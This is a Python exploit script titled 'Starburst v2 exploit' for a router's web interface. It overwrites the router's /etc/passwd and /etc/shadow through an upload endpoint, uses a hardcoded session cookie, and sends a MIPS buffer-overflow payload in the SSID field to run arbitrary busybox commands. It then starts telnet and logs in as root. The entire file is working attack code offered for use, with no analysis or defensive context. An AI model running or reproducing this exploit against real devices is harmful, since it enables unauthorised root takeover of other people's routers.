import argparse
import struct
import time
import telnetlib

from termcolor import colored
import requests

passwd_content = """
sysresumefileform\r
------WebKitFormBoundaryRY0m57TtzHmaTLaT\r
Content-Disposition: form-data; name="file1"; filename="passwd"\r
Content-Type: text/html\r\n\r\n
root:$1$yikWMdhq$cIUPc1dKQYHkkKkiVpM/v/:0:0:root:/root:/bin/sh
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
admin:$1$s0eJ96e.$9EjwaKxLMqkYxHRPArA4g/:15:0:user:/data:/bin/sh
mail:*:8:8:mail:/var/mail:/bin/sh
nobody:x:65534:65534:Nobody:/data/UsbDisk1/Volume1:/bin/sh"""

shadow_content = """
sysresumefileform\r
------WebKitFormBoundaryRY0m57TtzHmaTLaT\r
Content-Disposition: form-data; name="file1"; filename="shadow"\r
Content-Type: text/html\r\n\r
root:$1$D0o034Sm$LY0jyeFPifEXVmdgUfSEj/:15386:0:99999:7:::
bin:*:13341:0:99999:7:::
daemon:*:13341:0:99999:7:::
admin:$1$s0eJ96e.$9EjwaKxLMqkYxHRPArA4g/:13341:0:99999:7:::
mail:*:13732:0:99999:7:::
nobody:*:0:0:99999:7:::"""

cookies = {
    'SESSID': 'DE4ri41qPWOPIzWUxXLL8AJRbOA2Mzthdoyncodebyter',
    'Language': 'de_DE',
}


def p(val):
    return struct.pack("I", val)


def reset_passwd(ip):
    params = (
        ('uploadpath', '/etc/'),
        ('file', '1647027124436'),
    )

    requests.post(f'http://{ip}/upload.csp', params=params, data=passwd_content, verify=False)
    time.sleep(1)
    requests.post(f'http://{ip}/upload.csp', params=params, data=shadow_content, verify=False)

    print(colored('[+]', 'green') + " Passwords reset successful:")
    print("\tLog in with root:20080826 and admin:codebyter\n")


def login(ip):
    params = (
        ('function', 'set'),
        ('fname', 'security'),
        ('opt', 'pwdchk'),
        ('name', 'admin'),
        ('pwd1', 'codebyter'),
    )

    requests.get(f'http://{ip}/protocol.csp', params=params, cookies=cookies, verify=False)

    print(colored('[+]', 'green') + " Login successful:")
    print(f"\tCurrent Session cookie: {cookies['SESSID']}\n")


def exploit(ip, command):
    params = (
        ('fname', 'net'),
        ('opt', 'wifi_client'),
        ('function', 'set'),
    )

    offset = 408 - len(command)

    payload = b''
    payload += p(0x23e40124)  # add     $4, $31, 0x124
    payload += p(0x2084ff0c)  # add     $4, $4, -0xf4
    payload += p(0x8c98fffc)  # lw      $24, -4($4)
    payload += p(0x02f7b020)  # add     $22, $23, $23 (used as nop)
    payload += p(0x02f7b020)  # add     $22, $23, $23 (used as nop)
    payload += p(0x0319c822)  # sub     $25, $24, $25
    payload += p(0x02f7b020)  # add     $22, $23, $23 (used as nop)
    payload += p(0x0320f809)  # jalr    $25
    payload += p(0x0320f809)  # jalr    $25
    payload += p(0xdeadbeef)
    payload += p(0xdeadbeef)
    payload += p(0x2af5d5c4)  # 0x0040ce84 + t9 = 0x2ab50740 + 0x40ce84 (address of command payload + t9)
    payload += b'/bin/busybox ' + command.encode('utf-8') + b';\n\r\x0Aexit;\x0A'
    payload += b'A' * offset
    payload += b'\x01\x94\xec\x54'  # return address (0x0054ec9401)

    print(colored('[+]', 'green') + f" Launching buffer overflow exploit...")
    exploit_payload = f'SSID={payload.decode("latin-1")}&mac=7e%3Af1%3A33%3A34%3Aa1%3A37&passwd=supersecurepassword' \
                      f'&dhcp=1 '

    requests.post(f'http://{ip}/protocol.csp', params=params, cookies=cookies, data=exploit_payload, verify=False)
    print(colored('[+]', 'green') + f" Executed command: {command}\n")


def launch_telnet(ip):
    exploit(ip, "/etc/init.d/teld.sh start")

    print(colored('[+]', 'green') + f" Launching telnet as root user\n")
    time.sleep(2)
    tn = telnetlib.Telnet(ip)
    tn.read_until(b"login: ")
    tn.write(b"root\n")
    tn.read_until(b"Password: ")
    tn.write(b"20080826\n")
    tn.interact()


def main(ip, command):
    reset_passwd(ip)
    time.sleep(0.5)
    login(ip)
    time.sleep(0.5)
    if command:
        exploit(ip, command)
    else:
        launch_telnet(ip)


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Starburst v2 exploit')

    parser.add_argument('ip_address', type=str,
                        help='IP address og the router, e.g. 10.10.10.254')

    parser.add_argument('--command', type=str,
                        help='Custom command to execute (default: activate and connect to telnet)')

    args = parser.parse_args()

    main(args.ip_address, args.command)
